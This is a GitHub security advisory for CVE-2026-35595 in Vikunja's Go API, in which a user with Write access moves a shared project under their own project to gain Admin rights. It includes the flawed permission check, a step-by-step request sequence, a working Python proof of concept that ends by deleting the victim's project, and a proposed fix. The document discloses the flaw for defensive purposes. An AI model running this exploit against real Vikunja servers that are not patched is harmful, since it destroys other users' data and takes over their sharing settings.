# [H] Vikunja vulnerable to Privilege Escalation via Project Reparenting

## Summary
Severity: High
Advisory: GHSA-2vq4-854f-5c72
CVE: CVE-2026-35595
CWE: CWE-269
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-2vq4-854f-5c72
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

A user with Write-level access to a project can escalate their permissions to Admin by moving the project under a project they own. After reparenting, the recursive permission CTE resolves ownership of the new parent as Admin on the moved project. The attacker can then delete the project, manage shares, and remove other users' access.

## Details

The `CanUpdate` check at `pkg/models/project_permissions.go:139-148` only requires `CanWrite` on the new parent project when changing `parent_project_id`. However, Vikunja's permission model uses a recursive CTE that walks up the project hierarchy to compute permissions. Moving a project under a different parent changes the permission inheritance chain.

When a user has inherited Write access (from a parent project share) and reparents the child project under their own project tree, the CTE resolves their ownership of the new parent as Admin (permission level 2) on the moved project.

```go
if p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {
    newProject := &Project{ID: p.ParentProjectID}
    can, err := newProject.CanWrite(s, a)  // Only checks Write, not Admin
    if err != nil {
        return false, err
    }
    if !can {
        return false, ErrGenericForbidden{}
    }
}
```

## Proof of Concept

Tested on Vikunja v2.2.2.

```
1. victim creates "Parent Project" (id=3)
2. victim creates "Secret Child" (id=4) under Parent Project
3. victim shares Parent Project with attacker at Write level (permission=1)
   -> attacker inherits Write on Secret Child (no direct share)
4. attacker creates own "Attacker Root" project (id=5)
5. attacker verifies: DELETE /api/v1/projects/4 -> 403 Forbidden
6. attacker sends: POST /api/v1/projects/4 {"title":"Secret Child","parent_project_id":5}
   -> 200 OK (reparenting succeeds, only requires Write)
7. attacker sends: DELETE /api/v1/projects/4 -> 200 OK
   -> Project deleted. victim gets 404.
```

```python                                                                                                                                                                                                                                                                                                        
import requests                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                
TARGET = "http://localhost:3456"                                                                                                                                                                                                                                                                                 
API = f"{TARGET}/api/v1"  
                                        
def login(u, p):                     
    return requests.post(f"{API}/login", json={"username": u, "password": p}).json()["token"]
                                        
def h(token):  
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
                                                                                                                                                                                                                                                                                                                    
victim_token = login("victim", "Victim123!")
attacker_token = login("attacker", "Attacker123!")                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                
# victim creates parent -> child project hierarchy                                                                                                                                                                                                                                                               
parent = requests.put(f"{API}/projects", headers=h(victim_token),
                    json={"title": "Parent Project"}).json()
child = requests.put(f"{API}/projects", headers=h(victim_token),
                    json={"title": "Secret Child", "parent_project_id": parent["id"]}).json()

# victim shares parent with attacker at Write (attacker inherits Write on child)
requests.put(f"{API}/projects/{parent['id']}/users", headers=h(victim_token),
            json={"username": "attacker", "permission": 1})

# attacker creates own root project
own = requests.put(f"{API}/projects", headers=h(attacker_token),
                    json={"title": "Attacker Root"}).json()

# before: attacker cannot delete child
r = requests.delete(f"{API}/projects/{child['id']}", headers=h(attacker_token))
print(f"DELETE before reparent: {r.status_code}")  # 403

# exploit: reparent child under attacker's project
r = requests.post(f"{API}/projects/{child['id']}", headers=h(attacker_token),
                json={"title": "Secret Child", "parent_project_id": own["id"]})
print(f"Reparent: {r.status_code}")  # 200

# after: attacker can now delete child
r = requests.delete(f"{API}/projects/{child['id']}", headers=h(attacker_token))
print(f"DELETE after reparent: {r.status_code}")  # 200 - escalated to Admin

# victim lost access
r = requests.get(f"{API}/projects/{child['id']}", headers=h(victim_token))
print(f"Victim access: {r.status_code}")  # 404 - project gone
```

Output:
```
DELETE before reparent: 403
Reparent: 200
DELETE after reparent: 200
Victim access: 404
```

The attacker escalated from inherited Write to Admin by reparenting, then deleted the victim's project.

## Impact

Any user with Write permission on a shared project can escalate to full Admin by moving the project under their own project tree via a single API call. After escalation, the attacker can delete the project (destroying all tasks, attachments, and history), remove other users' access, and manage sharing settings. This affects any project where Write access has been shared with collaborators.

## Recommended Fix

Require Admin permission instead of Write when changing `parent_project_id`:

```go
if p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {
    newProject := &Project{ID: p.ParentProjectID}
    can, err := newProject.IsAdmin(s, a)
    if err != nil {
        return false, err
    }
    if !can {
        return false, ErrGenericForbidden{}
    }
    canAdmin, err := p.IsAdmin(s, a)
    if err != nil {
        return false, err
    }
    if !canAdmin {
        return false, ErrGenericForbidden{}
    }
}
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2vq4-854f-5c72
- https://nvd.nist.gov/vuln/detail/CVE-2026-35595
- https://github.com/go-vikunja/vikunja/pull/2583
- https://github.com/go-vikunja/vikunja/commit/c03d682f48aff890eeb3c8b41d38226069722827
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
